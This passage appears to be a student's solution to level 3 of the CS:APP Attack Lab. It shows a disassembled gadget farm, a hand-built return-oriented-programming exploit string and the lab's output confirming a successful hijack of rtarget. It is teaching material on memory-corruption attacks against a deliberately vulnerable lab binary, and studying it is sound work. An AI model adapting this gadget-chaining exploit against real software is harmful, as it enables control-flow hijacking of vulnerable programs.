1126:0000000000402119 <start_farm>:
1127-  402119:	f3 0f 1e fa          	endbr64 
1128-  40211d:	b8 01 00 00 00       	mov    $0x1,%eax
1129-  402122:	c3                   	ret    
1130-
1131-0000000000402123 <getval_181>:
1132-  402123:	f3 0f 1e fa          	endbr64 
1133-  402127:	b8 48 89 c7 90       	mov    $0x90c78948,%eax
1134-  40212c:	c3                   	ret    
1135-
1136-000000000040212d <setval_210>:
1137-  40212d:	f3 0f 1e fa          	endbr64 
1138-  402131:	c7 07 48 89 c7 c1    	movl   $0xc1c78948,(%rdi)
1139-  402137:	c3                   	ret    
1140-
1141-0000000000402138 <addval_493>:
1142-  402138:	f3 0f 1e fa          	endbr64 
1143-  40213c:	8d 87 43 58 94 90    	lea    -0x6f6ba7bd(%rdi),%eax
1144-  402142:	c3                   	ret    
1145-
1146-0000000000402143 <setval_394>:
1147-  402143:	f3 0f 1e fa          	endbr64 
1148-  402147:	c7 07 db 58 90 90    	movl   $0x909058db,(%rdi)
1149-  40214d:	c3                   	ret    
1150-
1151-000000000040214e <addval_233>:
1152-  40214e:	f3 0f 1e fa          	endbr64 
1153-  402152:	8d 87 48 89 c7 c1    	lea    -0x3e3876b8(%rdi),%eax
1154-  402158:	c3                   	ret    
1155-
1156-0000000000402159 <addval_397>:
1157-  402159:	f3 0f 1e fa          	endbr64 
1158-  40215d:	8d 87 fc 48 89 c7    	lea    -0x3876b704(%rdi),%eax
1159-  402163:	c3                   	ret    
1160-
1161-0000000000402164 <addval_311>:
1162-  402164:	f3 0f 1e fa          	endbr64 
1163-  402168:	8d 87 58 90 91 c3    	lea    -0x3c6e6fa8(%rdi),%eax
1164-  40216e:	c3                   	ret    
1165-
1166-000000000040216f <setval_198>:
1167-  40216f:	f3 0f 1e fa          	endbr64 
1168-  402173:	c7 07 bc 58 90 c3    	movl   $0xc39058bc,(%rdi)
1169-  402179:	c3                   	ret    
1170-
1171-000000000040217a <mid_farm>:
1172-  40217a:	f3 0f 1e fa          	endbr64 
1173-  40217e:	b8 01 00 00 00       	mov    $0x1,%eax
1174-  402183:	c3                   	ret    
1175-
1176-0000000000402184 <add_xy>:
1177-  402184:	f3 0f 1e fa          	endbr64 
1178-  402188:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
1179-  40218c:	c3                   	ret    
1180-
1181-000000000040218d <setval_154>:
1182-  40218d:	f3 0f 1e fa          	endbr64 
1183-  402191:	c7 07 89 d1 90 c3    	movl   $0xc390d189,(%rdi)
1184-  402197:	c3                   	ret    
1185-
1186-0000000000402198 <addval_168>:
1187-  402198:	f3 0f 1e fa          	endbr64 
1188-  40219c:	8d 87 4b 48 8d e0    	lea    -0x1f72b7b5(%rdi),%eax
1189-  4021a2:	c3                   	ret    
1190-
1191-00000000004021a3 <getval_201>:
1192-  4021a3:	f3 0f 1e fa          	endbr64 
1193-  4021a7:	b8 6d ae 89 ce       	mov    $0xce89ae6d,%eax
1194-  4021ac:	c3                   	ret    
1195-
1196-00000000004021ad <setval_276>:
1197-  4021ad:	f3 0f 1e fa          	endbr64 
1198-  4021b1:	c7 07 89 ce 91 90    	movl   $0x9091ce89,(%rdi)
1199-  4021b7:	c3                   	ret    
1200-
1201-00000000004021b8 <addval_316>:
1202-  4021b8:	f3 0f 1e fa          	endbr64 
1203-  4021bc:	8d 87 48 89 e0 90    	lea    -0x6f1f76b8(%rdi),%eax
1204-  4021c2:	c3                   	ret    
1205-
1206-00000000004021c3 <getval_398>:
1207-  4021c3:	f3 0f 1e fa          	endbr64 
1208-  4021c7:	b8 48 89 e0 c2       	mov    $0xc2e08948,%eax
1209-  4021cc:	c3                   	ret    
1210-
1211-00000000004021cd <addval_100>:
1212-  4021cd:	f3 0f 1e fa          	endbr64 
1213-  4021d1:	8d 87 09 c2 38 db    	lea    -0x24c73df7(%rdi),%eax
1214-  4021d7:	c3                   	ret    
1215-
1216-00000000004021d8 <getval_383>:
1217-  4021d8:	f3 0f 1e fa          	endbr64 
1218-  4021dc:	b8 89 c2 c7 1c       	mov    $0x1cc7c289,%eax
1219-  4021e1:	c3                   	ret    
1220-
1221-00000000004021e2 <getval_455>:
1222-  4021e2:	f3 0f 1e fa          	endbr64 
1223-  4021e6:	b8 89 c2 91 c3       	mov    $0xc391c289,%eax
1224-  4021eb:	c3                   	ret    
1225-
1226-00000000004021ec <addval_322>:
1227-  4021ec:	f3 0f 1e fa          	endbr64 
1228-  4021f0:	8d 87 89 ce 48 c9    	lea    -0x36b73177(%rdi),%eax
1229-  4021f6:	c3                   	ret    
1230-
1231-00000000004021f7 <addval_118>:
1232-  4021f7:	f3 0f 1e fa          	endbr64 
1233-  4021fb:	8d 87 09 ce 90 90    	lea    -0x6f6f31f7(%rdi),%eax
1234-  402201:	c3                   	ret    
1235-
1236-0000000000402202 <addval_172>:
1237-  402202:	f3 0f 1e fa          	endbr64 
1238-  402206:	8d 87 48 89 e0 c2    	lea    -0x3d1f76b8(%rdi),%eax
1239-  40220c:	c3                   	ret    
1240-
1241-000000000040220d <getval_357>:
1242-  40220d:	f3 0f 1e fa          	endbr64 
1243-  402211:	b8 48 89 e0 c3       	mov    $0xc3e08948,%eax
1244-  402216:	c3                   	ret    
1245-
1246-0000000000402217 <getval_329>:
1247-  402217:	f3 0f 1e fa          	endbr64 
1248-  40221b:	b8 89 d1 92 90       	mov    $0x9092d189,%eax
1249-  402220:	c3                   	ret    
1250-
1251-0000000000402221 <setval_370>:
1252-  402221:	f3 0f 1e fa          	endbr64 
1253-  402225:	c7 07 34 89 ce 91    	movl   $0x91ce8934,(%rdi)
1254-  40222b:	c3                   	ret    
1255-
1256-000000000040222c <setval_182>:
1257-  40222c:	f3 0f 1e fa          	endbr64 
1258-  402230:	c7 07 89 c2 91 c3    	movl   $0xc391c289,(%rdi)
1259-  402236:	c3                   	ret    
1260-
1261-0000000000402237 <getval_186>:
1262-  402237:	f3 0f 1e fa          	endbr64 
1263-  40223b:	b8 89 c2 c3 5b       	mov    $0x5bc3c289,%eax
1264-  402240:	c3                   	ret    
1265-
1266-0000000000402241 <addval_498>:
1267-  402241:	f3 0f 1e fa          	endbr64 
1268-  402245:	8d 87 8f fb a9 d1    	lea    -0x2e560471(%rdi),%eax
1269-  40224b:	c3                   	ret    
1270-
1271-000000000040224c <setval_122>:
1272-  40224c:	f3 0f 1e fa          	endbr64 
1273-  402250:	c7 07 89 c2 00 d2    	movl   $0xd200c289,(%rdi)
1274-  402256:	c3                   	ret    
1275-
1276-0000000000402257 <getval_273>:
1277-  402257:	f3 0f 1e fa          	endbr64 
1278-  40225b:	b8 89 d1 00 c0       	mov    $0xc000d189,%eax
1279-  402260:	c3                   	ret    
1280-
1281-0000000000402261 <addval_144>:
1282-  402261:	f3 0f 1e fa          	endbr64 
1283-  402265:	8d 87 48 8b e0 c3    	lea    -0x3c1f74b8(%rdi),%eax
1284-  40226b:	c3                   	ret    
1285-
1286-000000000040226c <setval_497>:
1287-  40226c:	f3 0f 1e fa          	endbr64 
1288-  402270:	c7 07 89 d1 84 c9    	movl   $0xc984d189,(%rdi)
1289-  402276:	c3                   	ret    
1290-
1291-0000000000402277 <getval_429>:
1292-  402277:	f3 0f 1e fa          	endbr64 
1293-  40227b:	b8 89 d1 c7 37       	mov    $0x37c7d189,%eax
1294-  402280:	c3                   	ret    
1295-
1296-0000000000402281 <setval_231>:
1297-  402281:	f3 0f 1e fa          	endbr64 
1298-  402285:	c7 07 23 48 a9 e0    	movl   $0xe0a94823,(%rdi)
1299-  40228b:	c3                   	ret    
1300-
1301-000000000040228c <getval_200>:
1302-  40228c:	f3 0f 1e fa          	endbr64 
1303-  402290:	b8 89 ce 84 db       	mov    $0xdb84ce89,%eax
1304-  402295:	c3                   	ret    
1305-
1306-0000000000402296 <addval_367>:
1307-  402296:	f3 0f 1e fa          	endbr64 
1308-  40229a:	8d 87 99 d1 90 c3    	lea    -0x3c6f2e67(%rdi),%eax
1309-  4022a0:	c3                   	ret    
1310-
1311-00000000004022a1 <setval_345>:
1312-  4022a1:	f3 0f 1e fa          	endbr64 
1313-  4022a5:	c7 07 8d ce 20 c9    	movl   $0xc920ce8d,(%rdi)
1314-  4022ab:	c3                   	ret    
1315-
1316-00000000004022ac <setval_468>:
1317-  4022ac:	f3 0f 1e fa          	endbr64 
1318-  4022b0:	c7 07 09 d1 38 db    	movl   $0xdb38d109,(%rdi)
1319-  4022b6:	c3                   	ret    
1320-
1321-00000000004022b7 <addval_174>:
1322-  4022b7:	f3 0f 1e fa          	endbr64 
1323-  4022bb:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
1324-  4022c1:	c3                   	ret    
1325-
1326-00000000004022c2 <setval_230>:
B24040307@ICS:~/target48$ cat > rtarget.l3 <<'EOF'
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
12 22 40 00 00 00 00 00
28 21 40 00 00 00 00 00
76 21 40 00 00 00 00 00
48 00 00 00 00 00 00 00
3c 22 40 00 00 00 00 00
93 21 40 00 00 00 00 00
91 22 40 00 00 00 00 00
88 21 40 00 00 00 00 00
28 21 40 00 00 00 00 00
74 20 40 00 00 00 00 00
31 63 32 61 33 32 34 35 00
EOF
B24040307@ICS:~/target48$ ./hex2raw < rtarget.l3 > rlevel3.txt
B24040307@ICS:~/target48$ LD_PRELOAD=./printf.so ./rtarget -q < rlevel3.txt
Cookie: 0x1c2a3245
Type string:Touch3!: You called touch3("1c2a3245")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
	user id	B24040307
	course	15213-f15
	lab	attacklab
	result	48:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 12 22 40 00 00 00 00 00 28 21 40 00 00 00 00 00 76 21 40 00 00 00 00 00 48 00 00 00 00 00 00 00 3C 22 40 00 00 00 00 00 93 21 40 00 00 00 00 00 91 22 40 00 00 00 00 00 88 21 40 00 00 00 00 00 28 21 40 00 00 00 00 00 74 20 40 00 00 00 00 00 31 63 32 61 33 32 34 35 00 
B24040307@ICS:~/target48$ LD_PRELOAD=./printf.so ./rtarget < rlevel3.txt
Cookie: 0x1c2a3245
Type string:Touch3!: You called touch3("1c2a3245")
Valid solution for level 3 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
B24040307@ICS:~/target48$
```

![](https://cdn.jsdelivr.net/gh/Aobzii2024/Aobzii-Blog@main/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-05-11%20194740.png)